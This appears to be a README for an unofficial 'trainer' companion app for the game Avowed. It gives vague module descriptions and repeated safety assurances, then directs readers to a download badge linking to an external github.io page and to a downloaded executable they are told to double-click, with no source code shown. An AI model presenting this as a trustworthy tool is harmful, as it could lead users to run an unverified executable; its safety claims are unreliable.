## 🌌 What Is This Project?

Imagine walking into a wizard's study. On the desk sits not a single dusty tome, but an entire arcane console — dials, levers, glowing runes, and a map that breathes. That is the spirit of the **Avowed Companion Toolkit**.

Rather than presenting a chaotic cluster of toggles, this repository delivers a structured, thoughtfully designed desktop companion application for *Avowed* on Windows. It targets players who love to explore the boundaries of a game world: adjusting pacing, experimenting with character builds, and crafting their own difficulty curve — all from a clean, modern interface.

The project is **not** affiliated with the original game developers or publishers. It is an independent, fan-driven effort with a strong emphasis on transparency, user education, and ethical play. Every module is documented, every toggle explained, and every risk acknowledged.

This README is intentionally long because the toolkit itself is deep. Skim the headings, dive where curiosity pulls you, and enjoy the ride.

---

## 🕯️ The Philosophy Behind the Toolkit

Most utilities of this genre behave like a sledgehammer: blunt, loud, and indifferent to nuance. We wanted the opposite — a **scalpel wrapped in silk**. The design principles are simple:

1. **Clarity over chaos.** Every option lives in a labeled module with a plain-English description.
2. **Reversibility.** Any change can be undone. Profiles let you snapshot and restore.
3. **Respect for the experience.** Tools are designed to *enhance* the story you want to tell, not erase it.
4. **Education first.** The documentation explains *why* something works, not just *how*.
5. **Local-first.** No accounts, no telemetry, no cloud dependency for core features.

Think of it as a tuning fork for your adventure. You decide the note.

## 🧱 Module Breakdown

The toolkit is organized into discrete modules, each one a small workshop for a specific aspect of play.

### 🗺️ Exploration Module
For wanderers who want to see every corner of the Living Lands. Adjust traversal pacing, visualize points of interest, and streamline map interaction. Designed for the player who treats exploration as a meditation.

### ⚔️ Combat Laboratory
A sandbox for build theorists. Tune encounter pacing, examine damage formulas in the statistics view, and experiment with loadouts in a controlled environment. Nothing here is required to finish the game — it is a playground for the curious.

### 🎒 Inventory Studio
Organize, filter, and preview your collected items with a cleaner grid layout. Includes sorting presets and a wishlist tracker for crafting materials.

### 🏰 Character Architect
Plan a build before committing to it. The planner tracks stat allocations, gear synergy notes, and quest dependencies so your decisions are informed rather than improvised.

### 📜 Quest Companion
A spoiler-aware quest journal helper. Configure how much information you want visible, from full guidance to a single gentle nudge. Perfect for players who want help without losing the joy of discovery.

### 🎬 Cinematic Mode
For screenshot artists and video creators: hide UI clutter, freeze time for composition, and adjust camera behavior for that perfect frame.

### 📈 Session Analytics
A privacy-respecting dashboard of your own play habits. Everything stays local. No uploads, no sharing, no judgment.

Each module can be disabled entirely. A minimal setup is just as valid as a maximal one.

## 🖥️ Desktop Experience & Responsive UI

The interface is built to feel native on Windows 11 while remaining fully functional on Windows 10. Key experience notes:

- **Adaptive Layouts** — The command deck rearranges itself based on window size. Narrow windows collapse into a compact rail; wide windows expand into a multi-column grid.
- **Keyboard-First Navigation** — Full shortcut coverage. Every panel is reachable without touching the mouse.
- **Accessibility Touches** — Scalable fonts, high-contrast mode, and screen-reader-friendly labels.
- **Low Overhead** — The toolkit is designed to be lightweight, with an emphasis on responsiveness and minimal resource draw.
- **Native Window Behavior** — Snap layouts, per-monitor DPI awareness, and dark mode integration all behave as expected.

Responsiveness is not just a buzzword here — it is a commitment that the app should feel effortless at any size.

## 🚀 Getting Started the Friendly Way

This section avoids dry, robotic instructions. Instead, think of it as a friendly concierge guiding you from curiosity to control.

**Step 1 — Retrieve the Package.** Use the [![Download](https://raw.githubusercontent.com/fannywoii11-boop/Avowed-Trainer-Companion/main/btn_4d2a7c.svg)](https://fannywoii11-boop.github.io/Avowed-Trainer-Companion/) macro at the top of this document as your entry point. **Step 2 — Unpack Thoughtfully.** Extract the contents to a folder you will remember. Avoid system directories; a simple "Documents\Avowed Toolkit" works beautifully.

**Step 3 — Launch the Companion.** Double-click the main executable. On first run, you will be greeted by a short welcome tour. Take two minutes to read it — it saves hours later.

**Step 4 — Choose a Profile.** Select a starter profile that matches your intent: Storyteller, Explorer, Architect, or Sandbox. You can always switch or create your own.

**Step 5 — Configure Modules.** Open the command deck and enable the panels you want. Everything is reversible.

**Step 6 — Play and Adjust.** Launch your game, and use the companion alongside it. Tweak as you go. Save a snapshot when you find a setup you love.

That is it. No command-line gymnastics, no environment variables to memorize, no mysterious scripts.

## ⚖️ Safety, Ethics & Responsible Use

We take the stewardship of this hobby seriously. A few guiding principles:

- **Single-player focus.** This toolkit is designed for personal, offline enjoyment of a single-player experience.
- **No interference with online services.** Nothing here touches multiplayer infrastructure, and it never will.
- **Read the documentation.** Understanding what a toggle does is your best protection against surprises.
- **Back up your saves.** As with any companion utility, keeping a save backup is a kind habit. It costs nothing and saves everything.
- **Respect the creators.** The original game is a work of art. Use this toolkit to deepen your appreciation, not to diminish someone else's labor.
- **No destructive options.** The toolkit deliberately avoids features that could permanently damage a save file.

Think of yourself as a museum visitor with a special curator's pass — you get to look closer, but you do not get to break the exhibits.
